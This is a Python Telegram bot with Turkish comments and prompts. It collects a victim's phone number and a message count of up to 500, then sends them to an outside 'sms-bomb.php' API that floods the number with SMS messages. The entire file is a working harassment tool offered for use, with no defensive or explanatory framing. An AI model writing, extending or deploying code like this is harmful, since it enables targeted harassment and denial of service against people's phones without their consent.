import os
import requests
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
    CallbackQueryHandler,
)

# TOKEN environment variable'dan alınır (Railway için zorunlu)
TOKEN = os.getenv("BOT_TOKEN")

if not TOKEN:
    raise ValueError("BOT_TOKEN bulunamadı! Railway Environment Variables ekle.")

API_URL = "https://cvron.alwaysdata.net/cvronapi/sms-bomb.php"

# LOG sistemi (Railway crash önleme)
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

logger = logging.getLogger(__name__)

# Conversation states
PHONE, COUNT, CONFIRM = range(3)


# /start veya /sms
async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):

    keyboard = [[InlineKeyboardButton("Başla", callback_data="sms")]]

    await update.message.reply_text(
        "SMS botuna hoş geldin.\n"
        "Başlamak için butona bas.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

    return PHONE


# telefon iste
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query
    await query.answer()

    await query.edit_message_text(
        "Telefon numarasını gir:\n"
        "Örnek: 5xxxxxxxxx"
    )

    return PHONE


# telefonu al
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):

    phone = update.message.text.strip()

    if not phone.isdigit():
        await update.message.reply_text("Geçersiz telefon.")
        return PHONE

    context.user_data["phone"] = phone

    await update.message.reply_text("Adet gir (örn: 50):")

    return COUNT


# adet al
async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:

        count = int(update.message.text)

        if count <= 0 or count > 500:
            await update.message.reply_text("1-500 arası gir.")
            return COUNT

        context.user_data["count"] = count

        keyboard = [
            [InlineKeyboardButton("Onayla", callback_data="confirm_yes")],
            [InlineKeyboardButton("İptal", callback_data="confirm_no")],
        ]

        await update.message.reply_text(
            f"Telefon: {context.user_data['phone']}\n"
            f"Adet: {count}\n\nOnaylıyor musun?",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

        return CONFIRM

    except:

        await update.message.reply_text("Geçersiz sayı.")
        return COUNT


# onay
async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query
    await query.answer()

    if query.data == "confirm_yes":

        phone = context.user_data.get("phone")
        count = context.user_data.get("count")

        url = f"{API_URL}?phone={phone}&count={count}"

        try:

            response = requests.get(url, timeout=30)

            if response.status_code == 200:

                await query.edit_message_text(
                    "Gönderim başlatıldı."
                )

            else:

                await query.edit_message_text(
                    "API hata verdi."
                )

        except Exception as e:

            logger.error(e)

            await query.edit_message_text(
                "Bağlantı hatası."
            )

    else:

        await query.edit_message_text(
            "İptal edildi."
        )

    return ConversationHandler.END


# cancel
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text("İptal edildi.")

    return ConversationHandler.END


# main
def main():

    app = ApplicationBuilder().token(TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("sms", sms)],
        states={
            PHONE: [
                CallbackQueryHandler(ask_phone, pattern="^sms$"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
            ],
            COUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)
            ],
            CONFIRM: [
                CallbackQueryHandler(confirm)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv)

    print("Bot aktif")

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
